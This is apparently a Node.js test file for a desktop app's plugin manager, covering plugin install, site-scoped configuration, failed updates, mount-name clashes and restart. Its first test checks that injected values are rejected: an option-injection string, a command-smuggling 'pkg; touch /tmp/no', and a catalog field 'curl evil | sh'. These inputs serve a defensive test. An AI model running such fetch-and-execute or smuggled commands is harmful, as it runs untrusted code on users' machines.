import assert from 'node:assert/strict';
import { test } from 'node:test';
import { mkdtemp, mkdir, writeFile, rm } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join, resolve } from 'node:path';
import { PluginManager } from '../src/host/plugin-manager.ts';
import { parseMarketCatalog } from '../src/host/plugin-market.ts';
import { installSourceSchema } from '../src/core/plugin-contracts.ts';

await test('market sources are data, never shell commands', () => {
  assert.equal(installSourceSchema.safeParse('--config.foo=bar').success, false);
  assert.equal(installSourceSchema.safeParse('pkg; touch /tmp/no').success, false);
  assert.deepEqual(
    parseMarketCatalog({
      plugins: [
        {
          name: 'demo',
          owner: 'author',
          url: 'https://github.com/author/demo',
          description: { zh: '示例' },
          npm: 'dsh-demo',
          install: 'curl evil | sh',
        },
      ],
    }).map((entry) => entry.source),
    ['dsh-demo'],
  );
});

await test(
  'native DSH install, projection, unique mount, failed update and restart',
  { timeout: 60000 },
  async () => {
    const root = await mkdtemp(join(tmpdir(), 'deskwork-plugin-test-'));
    const plugin = join(root, 'plugin');
    await mkdir(plugin);
    const manifest = {
      name: 'deskwork-test-plugin',
      version: '1.0.0',
      type: 'module',
      dsh: { bundle: { patch: './cordis.patch.yml' } },
    };
    await writeFile(join(plugin, 'package.json'), JSON.stringify(manifest));
    await writeFile(join(plugin, 'cordis.patch.yml'), '[]\n');
    const options = {
      directory: join(root, 'plugins'),
      executable: process.execPath,
      cliPath: resolve('node_modules/@deepseek-ai/dsh/lib/bin.js'),
      pnpmPath: resolve('node_modules/pnpm/bin/pnpm.cjs'),
    };
    const manager = new PluginManager(options);
    try {
      await manager.load();
      await manager.install(`file:${plugin}`);
      const installed = manager.state().installed[0];
      assert.ok(installed);
      assert.equal(installed.version, '1.0.0');
      await manager.command({
        action: 'configure',
        name: installed.name,
        mountName: 'test-menu',
        enabled: true,
        siteIds: ['site-a'],
      });
      assert.equal((await manager.prepareRuntime(join(root, 'runtime-a'), 'site-a')).length, 1);
      assert.equal((await manager.prepareRuntime(join(root, 'runtime-b'), 'site-b')).length, 0);
      await writeFile(
        join(plugin, 'package.json'),
        JSON.stringify({ ...manifest, version: '2.0.0', dsh: {} }),
      );
      await assert.rejects(manager.command({ action: 'update', name: installed.name }));
      assert.equal(manager.state().installed[0]?.version, '1.0.0');
      await writeFile(
        join(plugin, 'package.json'),
        JSON.stringify({ ...manifest, name: 'deskwork-second-plugin' }),
      );
      await manager.install(`file:${plugin}`);
      await assert.rejects(
        manager.command({
          action: 'configure',
          name: 'deskwork-second-plugin',
          mountName: 'test-menu',
          enabled: true,
          siteIds: [],
        }),
        /挂载名/,
      );
      await manager.command({ action: 'remove', name: 'deskwork-second-plugin' });
      const restored = new PluginManager(options);
      await restored.load();
      assert.equal(restored.state().installed[0]?.mountName, 'test-menu');
      await restored.command({ action: 'remove', name: installed.name });
      assert.equal(restored.state().installed.length, 0);
    } finally {
      await rm(root, { recursive: true, force: true });
    }
  },
);
